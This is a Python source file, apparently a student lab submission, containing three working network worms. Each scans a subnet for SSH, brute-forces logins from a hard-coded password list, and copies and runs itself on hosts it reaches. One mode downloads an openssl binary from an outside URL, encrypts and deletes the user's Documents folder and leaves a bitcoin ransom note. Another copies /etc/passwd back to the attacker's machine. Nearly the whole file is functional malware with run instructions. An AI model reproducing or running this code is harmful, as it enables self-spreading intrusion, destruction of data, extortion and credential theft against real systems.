#!/usr/bin/python

'''
Curtis Galvez

Node: redacted.ecs.fullerton.edu
User: cs1
Pass: <password>
VM  : Ubuntu 12.04

Please use the following command(s) to execute the worm from the /tmp directory:
    cp ~/worm.py /tmp/worm.py
    cd /tmp
    chmod u+x worm.py
    ./worm.py ARGS
OR
    cp ~/worm.py /tmp/worm.py
    python worm.py ARGS

This submission is special because it contains the implementation of the three worms.
The worm(s) can be executed using different arguments when executed. Some arguments
are optional and will be called by the worm when it is run on remote systems.

If you would like to view the steps of the worm while it is assimiliating
pass -v as an argument to save a log file in the /tmp directory and print
the output to the terminal. Passing in -z will not mark the current system
as infected. However, it should be noted because of the lab environment the
worm may infect the attacker system as well, but in a real world scenerio
the credentials of the attacker system would not be included in the dict.

The Replicator Worm:        : python worm.py -az
The Extorter Worm           : python worm.py -e PASSWORD -z
The Password File Thief Worm: python -s -u USERNAME -p PASSWORD -i IPADDRESS -z

  optional arguments:
  -h, --help            show this help message and exit
  -a, --assimilate      Borg assimilation worm.
  -e ENCRYPT, --encrypt ENCRYPT
                        Ransomware worm.
  -t TRASH, --trash TRASH
                        Called by ransomware worm to encrypt files on remote
                        machine.
  -s, --steal           Acquire passwd file from remote machine. Requires:
                        username, password, and IP address.
  -c, --copy            Called by acquire passwd to copy passwd from remote
                        machine back to origin machine.
  -u USERNAME, --username USERNAME
                        Your username
  -p PASSWORD, --password PASSWORD
                        Your password
  -i IPADDRESS, --ipaddress IPADDRESS
                        Your IP address
  -v, --verbose         Verbose logging
  -z, --zed             Do not touch my balls.
'''

from datetime import datetime
import argparse
import netifaces
import nmap
import os
import paramiko
import shutil
import subprocess
import sys
import tarfile
import urllib

def log(e, verbose):
    if verbose:
        print('{0}:{1}:{2} - {3}'.format(datetime.now().hour, datetime.now().minute, datetime.now().second, e))
        with open('/tmp/worm.log', 'a') as f:
            f.write('{0}:{1}:{2} - {3}\n'.format(datetime.now().hour, datetime.now().minute, datetime.now().second, e))

def scan_network():
    # scan the network for hosts listening on port 22
    return nmap.PortScanner().scan('192.168.1.0/24', '22')

def get_credentials():
    # a list of usernames/passwords
    return [('user', 'password'), ('user2', 'password'), ('ubuntu', '123456'), ('root', '#Gig#'), ('cpsc', 'cpsc'), ('user3', 'password')]

def attack(hosts, login, worm, args, verbose):
    # go through list of hosts returned from nmap
    for host in hosts['scan']:
        # only attempt to access if host is available
        if hosts['scan'][host]['status']['state'] == 'up':
            for user in login:
                log('Attempting to login to {0} with credentials {1}:{2}'.format(host, user[0], user[1]), verbose)
                # attempt to login and if successful then break out of loop
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(host, username=user[0], password=user[1])
                    break
                except Exception as e:
                    ssh_client = None
                    log('Unable to login to {0} with credentials {1}:{2}'.format(host, user[0], user[1]), verbose)
                    log(str(e), verbose)
            if ssh_client != None:
                log('Connected to {0} with credentials {1}:{2}'.format(host, user[0], user[1]), verbose)
                status = replicate(ssh_client, worm, args, verbose)
                if status == True:
                    log('System has already been assimilated.', verbose)
                elif status == False:
                    log('System has been assimilated. Exiting.', verbose)
                    sys.exit(0)
                else:
                    log(status, verbose)
                ssh_client.close()

def replicate(ssh_client, worm, args, verbose):
    # open an sftp connection
    try:
        sftp = ssh_client.open_sftp()
    except Exception as e:
        log(str(e), verbose)
        return 'Unable to establish SFTP connection.'

    # if worm exists on system then exit
    # else copy the worm and mark it executable
    try:
        sftp.file('/tmp/touch_my', 'r', 1)
        return True
    except:
        pass

    try:
        sftp.put('/tmp/worm.py', '/tmp/worm.py')
        sftp.chmod('/tmp/worm.py', 777)
    except Exception as e:
        log(str(e), verbose)
        return 'Unable to upload worm to remote system.'

    # execute the worm on the remote system to replicate
    if worm == 'replicate':
        try:
            if verbose:
                ssh_client.exec_command('python /tmp/worm.py -a -v')
            else:
                ssh_client.exec_command('python /tmp/worm.py -a')
            log('{0} executed.'.format(worm), verbose)
        except Exception as e:
            log(str(e), verbose)
            return 'Unable to execute worm.'
    # execute the worm to encrypt the user directory on the remote system
    elif worm == 'encrypt':
        try:
            if verbose:
                ssh_client.exec_command('python /tmp/worm.py -t {0} -v'.format(args))
            else:
                ssh_client.exec_command('python /tmp/worm.py -t {0}'.format(args))
            log('{0} executed.'.format(worm), verbose)
        except Exception as e:
            log(str(e), verbose)
            return 'Unable to execute worm.'
    # execute the worm to steal the passwd file from the remote system
    elif worm == 'steal':
        try:
            if verbose:
                ssh_client.exec_command('python /tmp/worm.py -c -u {0} -p {1} -i {2} -v'.format(args.username, args.password, args.ipaddress))
            else:
                ssh_client.exec_command('python /tmp/worm.py -c -u {0} -p {1} -i {2}'.format(args.username, args.password, args.ipaddress))
            log('{0} executed.'.format(worm), verbose)
        except Exception as e:
            log(str(e), verbose)
            return 'Unable to execute worm.'
    return False

def encrypt(password, verbose):
    user = os.environ['USER']
    log(user, verbose)
    try:
        os.chdir('/home/{0}/Desktop'.format(user))
        log('Retrieving openssl...', verbose)
        urllib.urlretrieve('http://ecs.fullerton.edu/~mgofman/openssl', 'openssl')
        os.chmod('openssl', 777)
        os.chdir('/home/{0}/Documents'.format(user))
        log('cd ~/Documents', verbose)
        with tarfile.open('ead.tar', 'w') as tar:
            for file in os.listdir('.'):
                log('Adding {0} to tar'.format(file), verbose)
                tar.add(file)
        log('mv ead.tar ~/Desktop/ead.tar', verbose)
        shutil.move('ead.tar', '/home/{0}/Desktop/ead.tar'.format(user))
        log('cd ~/Desktop', verbose)
        os.chdir('/home/{0}/Desktop'.format(user))
        log('encrypting ead.tar with openssl', verbose)
        subprocess.call(['openssl', 'aes-256-cbc', '-e', '-salt', '-in', 'ead.tar', '-out', 'ead.tar.aes', '-pass', 'pass:{0}'.format(password)])
        log('rm ead.tar', verbose)
        os.remove('ead.tar')
        log('rm openssl', verbose)
        os.remove('openssl')
        log('rm -rf ~/Documents', verbose)
        shutil.rmtree('/home/{0}/Documents'.format(user))
        log('Leaving ransom note...', verbose)
        with open('ransom.txt', 'w') as f:
            f.write('\n\nYour files have been encrypted. Please pay a small fee of 6969 Bitcoins to receive the encryption key to decrypt.\n\nI like trains.\n\n')
    except Exception as e:
        log(str(e), verbose)

def steal_passwords(host, username, password, verbose):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=username, password=password)
    except Exception as e:
        log(str(e), verbose)
        sys.exit(1)
    sftp = ssh_client.open_sftp()
    sftp.put('/etc/passwd', '/tmp/passwd_{0}'.format(get_current_ip()))
    ssh_client.close()

def get_current_ip():
    try:
        current_ip = [netifaces.ifaddresses(net_face)[2][0]['addr'] for net_face in netifaces.interfaces() if not netifaces.ifaddresses(net_face)[2][0]['addr'] == '127.0.0.1'][0]
    except:
        current_ip = '0.0.0.0'
    return current_ip

def main():
    parser = argparse.ArgumentParser(description='Worms for errone.')
    parser.add_argument('-a', '--assimilate', action='store_true', help='Borg assimilation worm.')
    parser.add_argument('-e', '--encrypt', type=str, help='Ransomware worm.')
    parser.add_argument('-t', '--trash', type=str, help='Called by ransomware worm to encrypt files on remote machine.')
    parser.add_argument('-s', '--steal', action='store_true', help='Acquire passwd file from remote machine. Requires: username, password, and IP address.')
    parser.add_argument('-c', '--copy', action='store_true', help='Called by acquire passwd to copy passwd from remote machine back to origin machine.')
    parser.add_argument('-u', '--username', type=str, help='Your username')
    parser.add_argument('-p', '--password', type=str, help='Your password')
    parser.add_argument('-i', '--ipaddress', type=str, help='Your IP address')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose logging')
    parser.add_argument('-z', '--zed', action='store_true', help='Do not touch my balls.')
    args = parser.parse_args()

    # pass -z as an argument to disable marking system as infected
    if not args.zed:
        # if the worm has infected this system exit
        if os.path.isfile('/tmp/touch_my'):
            log('Worm exists on system. Exit.', args.verbose)
            sys.exit(0)
        # mark system as infected
        log('System is now infected.', args.verbose)
        with open('/tmp/touch_my', 'w') as f:
            f.write('balls')

    if args:
        # assimilation worm
        if args.assimilate:
            log('Attempting to assimilate hosts. Resistance is futile.', args.verbose)
            attack(scan_network(), get_credentials(), 'replicate', None, args.verbose)
        # if successful on remote system call args.trash
        elif args.encrypt:
            log('Attempting to ransom some files.', args.verbose)
            attack(scan_network(), get_credentials(), 'encrypt', args.encrypt, args.verbose)
        # if successful call args.copy
        elif args.steal and args.username and args.password and args.ipaddress:
            log('Attempting to get some passwd files.', args.verbose)
            attack(scan_network(), get_credentials(), 'steal', args, args.verbose)
        # encrypt document directory of user and attack again
        elif args.trash:
            log('Encrypting documents!', args.verbose)
            encrypt(args.trash, args.verbose)
            attack(scan_network(), get_credentials(), 'encrypt', args.trash, args.verbose)
        # copy passwd file back to attackers system and attack again
        elif args.copy and args.username and args.password and args.ipaddress:
            log('Sharing data.', args.verbose)
            steal_passwords(args.ipaddress, args.username, args.password, args.verbose)
            attack(scan_network(), get_credentials(), 'steal', args, args.verbose)

if __name__ == '__main__':
    main()
